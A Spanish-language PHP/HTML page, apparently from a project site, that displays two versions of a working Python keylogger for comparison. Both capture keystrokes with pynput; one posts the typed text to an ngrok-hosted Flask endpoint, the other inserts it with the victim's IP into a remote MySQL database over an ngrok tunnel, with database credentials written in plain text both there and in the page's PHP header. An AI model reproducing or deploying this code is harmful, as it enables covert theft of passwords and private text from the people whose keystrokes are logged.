<?php
    ob_start(); // Habilita el buffer de salida
    session_start();
    
    $servername = "mysql-db";
    $username = "sea";
    $password = "proyectose@";
    $database = "bd_keyloggers";

    // Conexión
    $conn = mysqli_connect($servername, $username, $password, $database);
    if (!$conn) {
        die("Conexion fallida: " . mysqli_connect_error());
    }
?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Scripts - Real</title>
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="../css/scriptsdos.css">

        <!-- Link favicon -->
        <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

        <!-- Link para que funcionen los FA FA -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />        

    </head>

    <body>
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='real.php'><i class='fa-regular fa-thumbs-up'></i> <span data-translate='real'>Real</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>
        <main>
            <!-- SOBRE LOS SCRIPTS -->
            <div class="cajascripts">
                <h2 class="scripts">Comparativa entre scripts</h2>
            </div>
            <hr class="highlight"/> <!-- SEPARADOR-->
            <section>
            <div>
                <div class="cajascripts">
                    <h2 class="scripts">
                        <i class="fa-solid fa-lock lock-icon_2"></i>
                    </h2>
                    <hr class="highlight"/> <!-- SEPARADOR-->
                </div>
                
                <div class="individual">
                    <div class="info_coaching">
                        <div class="Centrar_info_coaching">
                            <div class="col-lg-12 text-center">
                                <h2 class="ApartadoCoachingTit">Keylogger</h2>
                                <div class="imageneess">
                                    <p>
                                    # Enviar texto al servidor Flask por Ngrok <br>
                                    def enviar_a_flask(texto): <br>
                                        url = "https://b2fe-79-155-254-34.ngrok-free.app/guardar-real" <br>
                                        payload = { <br>
                                            "datosreal": texto <br>
                                        } <br>
                                        headers = { <br>
                                            "Content-Type": "application/json" <br>
                                        } <br>
                                        try: <br>
                                            requests.post(url, json=payload, headers=headers, timeout=3) <br>
                                        except: <br>
                                            pass
                                    </p>    
                                
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="individual">
                    <div class="info_coaching">
                        <div class="Centrar_info_coaching">
                            <div class="col-lg-12 text-center">
                                <h2 class="ApartadoCoachingTit">Keylogger</h2>
                                <div class="imageneess">
                                    <p>
                                    import pynput.keyboard <br>
                                    import requests <br>
                                    from datetime import datetime <br>
                                    import socket <br>
                                    <br>
                                    buffer = "" <br>
                                    <br>
                                    # Obtener la IP pública o local <br>
                                    def obtener_ip(): <br>
                                        try: <br>
                                            return requests.get("https://api.ipify.org").text <br>
                                        except: <br>
                                            try: <br>
                                                return socket.gethostbyname(socket.gethostname()) <br>
                                            except: <br>
                                                return '0.0.0.0' <br>
                                                <br>
                                    # Enviar texto al servidor Flask por Ngrok <br>
                                    def enviar_a_flask(texto): <br>
                                        url = "https://b2fe-79-155-254-34.ngrok-free.app/guardar-real" <br>
                                        payload = { <br>
                                            "datosreal": texto <br>
                                        } <br>
                                        headers = { <br>
                                            "Content-Type": "application/json" <br>
                                        } <br>
                                        try: <br>
                                            requests.post(url, json=payload, headers=headers, timeout=3) <br>
                                        except: <br>
                                            pass <br>
                                            <br>
                                    # Captura de teclas <br>
                                    def on_press(tecla): <br>
                                        global buffer <br>
                                        try: <br>
                                            if tecla == pynput.keyboard.Key.space: <br>
                                                buffer += ' ' <br>
                                            elif tecla == pynput.keyboard.Key.tab: <br>
                                                buffer += '\t' <br>
                                            elif tecla == pynput.keyboard.Key.enter: <br>
                                                enviar_a_flask(buffer) <br>
                                                buffer = "" <br>
                                            else: <br>
                                                buffer += tecla.char <br>
                                        except AttributeError: <br>
                                            # Ignorar teclas especiales <br>
                                            pass <br>
                                            <br>
                                    # Iniciar y asegurar envío final al salir <br>
                                    def iniciar_keylogger(): <br>
                                        global buffer <br>
                                        try: <br>
                                            with pynput.keyboard.Listener(on_press=on_press) as listener: <br>
                                                listener.join() <br>
                                        except KeyboardInterrupt: <br>
                                            pass <br>
                                        finally: <br>
                                            if buffer: <br>
                                                enviar_a_flask(buffer) <br>
                                                <br>
                                    # Punto de entrada <br>
                                    if __name__ == "__main__": <br>
                                        iniciar_keylogger()
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                </div>
                <div>
                <div class="cajascripts">
                    <h2 class="scripts">
                        <i class="fa-solid fa-lock-open lock-icon_2"></i>
                    </h2>
                    <hr class="highlight"/> <!-- SEPARADOR-->
                </div>
                
                <div class="individual">
                    <div class="info_coaching">
                        <div class="Centrar_info_coaching">
                            <div class="col-lg-12 text-center">
                                <h2 class="ApartadoCoachingTit">Keylogger</h2>
                                <div class="imageneess">
                                    <p>
                                    # Conectar a la base de datos a través del túnel Ngrok <br>
                                    def conectar_db(): <br>
                                        try: <br>
                                            conn = mysql.connector.connect( <br>
                                                host="6.tcp.eu.ngrok.io",  # Host de Ngrok <br>
                                                port=17864,            	# Puerto expuesto <br>
                                                user="****", <br>
                                                password="******", <br>
                                                database="********" <br>
                                            ) <br>
                                            return conn <br>
                                        except mysql.connector.Error: <br>
                                            return None <br>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="individual">
                    <div class="info_coaching">
                        <div class="Centrar_info_coaching">
                            <div class="col-lg-12 text-center">
                                <h2 class="ApartadoCoachingTit">Keylogger</h2>
                                <div class="imageneess">
                                    <p>
                                    import mysql.connector <br>
                                    import pynput.keyboard <br>
                                    from datetime import datetime <br>
                                    import socket <br>
                                    import requests <br>
                                    <br>
                                    # Acumulador de texto <br>
                                    buffer = "" <br>
                                    <br>
                                    # Obtener la IP pública o local del cliente <br>
                                    def obtener_ip(): <br>
                                        try: <br>
                                            return requests.get("https://api.ipify.org").text <br>
                                        except: <br>
                                            try: <br>
                                                return socket.gethostbyname(socket.gethostname()) <br>
                                            except: <br>
                                                return '0.0.0.0' <br>
                                                <br>
                                    # Conectar a la base de datos a través del túnel Ngrok <br>
                                    def conectar_db(): <br>
                                        try: <br>
                                            conn = mysql.connector.connect( <br>
                                                host="6.tcp.eu.ngrok.io",  # Host de Ngrok <br>
                                                port=17864,            	# Puerto expuesto <br>
                                                user="sea", <br>
                                                password="proyectose@", <br>
                                                database="bd_keyloggers" <br>
                                            ) <br>
                                            return conn <br>
                                        except mysql.connector.Error:
                                            return None <br>
                                            <br>
                                    # Guardar texto en la base de datos <br>
                                    def guardar_texto(texto): <br>
                                        conn = conectar_db() <br>
                                        if conn: <br>
                                            try: <br>
                                                cursor = conn.cursor() <br>
                                                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') <br>
                                                ip_cliente = obtener_ip() <br>
                                                cursor.execute( <br>
                                                    'INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, %s)', <br>
                                                    (timestamp, ip_cliente, texto, 'R') <br>
                                                ) <br>
                                                conn.commit() <br>
                                            except mysql.connector.Error: <br>
                                                pass <br>
                                            finally: <br>
                                                conn.close() <br>
                                                <br>
                                    # Cada vez que se pulsa una tecla <br>
                                    def on_press(tecla): <br>
                                        global buffer <br>
                                        try: <br>
                                            if tecla == pynput.keyboard.Key.space: <br>
                                                buffer += ' ' <br>
                                            elif tecla == pynput.keyboard.Key.tab: <br>
                                                buffer += '\t' <br>
                                            elif tecla == pynput.keyboard.Key.enter: <br>
                                                guardar_texto(buffer) <br>
                                                buffer = "" <br>
                                            else: <br>
                                                buffer += tecla.char <br>
                                        except AttributeError: <br>
                                            # Ignorar teclas especiales como F1, Ctrl, etc. <br>
                                            pass <br>
                                            <br>
                                    # Iniciar el listener que escucha las teclas <br>
                                    def iniciar_keylogger(): <br>
                                        with pynput.keyboard.Listener(on_press=on_press) as listener: <br>
                                            listener.join() <br>
                                            <br>
                                    # Punto de entrada principal <br>
                                    if __name__ == "__main__": <br>
                                        iniciar_keylogger()

                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </section>           
    </main>
    <!-- PIE DE PAGINA -->
    <footer>
    Todos los derechos reservados | Keylogger SL Copyright © 2025
    </footer>
    </body>
</html>
